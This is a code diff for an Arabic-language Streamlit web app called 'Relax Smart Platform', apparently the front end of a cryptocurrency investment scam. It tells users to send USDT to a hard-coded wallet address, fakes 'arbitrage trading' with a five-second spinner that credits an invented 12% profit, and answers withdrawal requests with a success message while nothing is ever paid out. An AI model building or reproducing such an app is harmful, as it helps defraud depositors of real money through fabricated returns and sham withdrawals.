@@ -1,58 +1,77 @@
 import streamlit as st
-from datetime import datetime, timedelta
+import time
 
-# إعدادات واجهة منصة Relax
-st.set_page_config(page_title="Relax Smart", page_icon="🟢", layout="centered")
+# إعدادات المنصة
+st.set_page_config(page_title="Relax Smart Platform", page_icon="🟢", layout="centered")
 
-# --- نظام البيانات المؤقتة ---
+# --- تنسيق احترافي ---
+st.markdown("""
+    <style>
+    .stButton>button { width: 100%; border-radius: 15px; height: 3.5em; font-weight: bold; }
+    .main-box { background-color: #ffffff; padding: 20px; border-radius: 15px; border: 1px solid #e1e4e8; text-align: center; }
+    .status-off { color: #888; font-size: 14px; }
+    .status-on { color: #28a745; font-weight: bold; }
+    </style>
+    """, unsafe_allow_html=True)
+
+# --- نظام الحساب (يبدأ دائماً بصفر) ---
 if 'balance_profit' not in st.session_state:
-    st.session_state.balance_profit = 18.50  # أرباح قابلة للسحب
+    st.session_state.balance_profit = 0.0
 if 'initial_deposit' not in st.session_state:
-    st.session_state.initial_deposit = 1000.00  # الإيداع الأساسي
-if 'deposit_date' not in st.session_state:
-    st.session_state.deposit_date = datetime.now() - timedelta(days=5) # مثال: أودع منذ 5 أيام
+    st.session_state.initial_deposit = 0.0
+if 'is_quantifying' not in st.session_state:
+    st.session_state.is_quantifying = False
 
-# حساب الـ 90 يوم
-days_passed = (datetime.now() - st.session_state.deposit_date).days
-days_remaining = max(0, 90 - days_passed)
+# القائمة الجانبية
+st.sidebar.title("💎 Relax Smart")
+menu = st.sidebar.radio("انتقل إلى:", ["🏠 الرئيسية", "📊 تحديد الكمية", "📤 ينسحب"])
 
-st.markdown("<h2 style='text-align: center; color: #28a745;'>📊 منصة Relax الذكية</h2>", unsafe_allow_html=True)
+# --- 🏠 الصفحة الرئيسية ---
+if menu == "🏠 الرئيسية":
+    st.markdown("<h2 style='text-align: center;'>الرئيسية</h2>", unsafe_allow_html=True)
+    st.markdown("<div class='main-box'>", unsafe_allow_html=True)
+    st.write("إجمالي الأصول المستثمرة")
+    st.subheader(f"{st.session_state.initial_deposit} USDT")
+    st.markdown("</div>", unsafe_allow_html=True)
+    
+    st.divider()
+    with st.expander("📥 تعبئة رصيد (إيداع)"):
+        st.write("حول USDT (BEP20) للعنوان:")
+        st.code("0x05aec19d3d5e5cb9400caff56ab69c3799019942")
+        if st.button("تأكيد الإيداع"):
+            st.success("تم إرسال الطلب للمراجعة.")
 
-# عرض الحالة المالية للمستثمر
-col1, col2 = st.columns(2)
-with col1:
-    st.metric("أرباحك (قابلة للسحب)", f"{st.session_state.balance_profit} USDT")
-with col2:
-    st.metric("رأس المال المستثمر", f"{st.session_state.initial_deposit} USDT")
-    st.caption(f"🔒 قفل السيولة: {days_remaining} يوم متبقي")
-
-st.divider()
-
-# القائمة الرئيسية للعمليات
-option = st.selectbox("اختر ما تريد القيام به:", ["نظرة عامة", "تعبئة رصيد (إيداع)", "سحب الأرباح", "سحب رأس المال"])
-
-if option == "تعبئة رصيد (إيداع)":
-    st.info("🔄 حول USDT (شبكة BEP20) إلى العنوان أدناه:")
-    st.code("0x05aec19d3d5e5cb9400caff56ab69c3799019942")
-    st.file_uploader("ارفع صورة إثبات التحويل")
-    if st.button("تأكيد الإيداع"):
-        st.success("تم الإرسال! سيتم تفعيل باقة الـ 90 يوم فور التأكيد.")
-
-elif option == "سحب الأرباح":
-    st.write(f"المبلغ المتاح للسحب الفوري: **{st.session_state.balance_profit} USDT**")
-    st.number_input("المبلغ المراد سحبه", min_value=5.0)
-    st.text_input("عنوان محفظتك (BEP20)")
-    if st.button("طلب سحب الأرباح"):
-        st.success("تم طلب السحب! سيصلك خلال 24 ساعة.")
-
-elif option == "سحب رأس المال":
-    if days_remaining > 0:
-        st.error(f"🚫 غير مسموح بسحب رأس المال حالياً. يجب مرور 90 يوماً. متبقي {days_remaining} يوم.")
-        st.info("ملاحظة: يمكنك سحب أرباحك اليومية بشكل طبيعي من قسم 'سحب الأرباح'.")
+# --- 📊 صفحة تحديد الكمية (الشرط الأساسي) ---
+elif menu == "📊 تحديد الكمية":
+    st.markdown("<h2 style='text-align: center;'>تحديد الكمية الذكي</h2>", unsafe_allow_html=True)
+    
+    # التحقق من وجود إيداع
+    if st.session_state.initial_deposit <= 0:
+        st.error("❌ لا يمكنك تشغيل التحديد الكمي. رصيد الإيداع الحالي هو 0.")
+        st.info("يرجى الذهاب للرئيسية وتعبئة الرصيد أولاً.")
     else:
-        st.success("✅ انتهت فترة القفل. يمكنك سحب رأس مالك الآن.")
-        st.button("سحب رأس المال")
+        st.success(f"✅ رصيدك المتاح للتشغيل: {st.session_state.initial_deposit} USDT")
+        if st.button("🚀 بدء التحديد الكمي المباشر"):
+            with st.spinner('جاري مسح أسعار السوق وتنفيذ صفقات Arbitrage...'):
+                time.sleep(5)
+                # حساب الربح (مثال: 12% من الإيداع)
+                profit = st.session_state.initial_deposit * 0.12
+                st.session_state.balance_profit += profit
+                st.balloons()
+                st.success(f"تم تحقيق ربح بقيمة {profit} USDT وإضافتها لمحفظة الأرباح.")
 
-# تسجيل الخروج
-if st.sidebar.button("تسجيل الخروج"):
-    st.rerun()
+# --- 📤 صفحة ينسحب (الحماية من السحب العشوائي) ---
+elif menu == "📤 ينسحب":
+    st.markdown("<h2 style='text-align: center;'>سحب الأرباح</h2>", unsafe_allow_html=True)
+    
+    # قفل السحب إذا لم يكن هناك أرباح
+    if st.session_state.balance_profit <= 0:
+        st.error("❌ رصيد الأرباح المتاح للسحب هو 0.00 USDT")
+        st.warning("يجب عليك الإيداع ثم تشغيل 'تحديد الكمية' أولاً لتتمكن من السحب.")
+        st.button("تأكيد السحب", disabled=True) # الزر معطل تماماً
+    else:
+        st.success(f"رصيدك القابل للسحب: {st.session_state.balance_profit} USDT")
+        amt = st.number_input("المبلغ المراد سحبه", min_value=10.0, max_value=st.session_state.balance_profit)
+        addr = st.text_input("عنوان المحفظة (BEP20)")
+        if st.button("تأكيد السحب"):
+            st.success("تم إرسال طلب السحب بنجاح. سيصلك خلال 24 ساعة.")
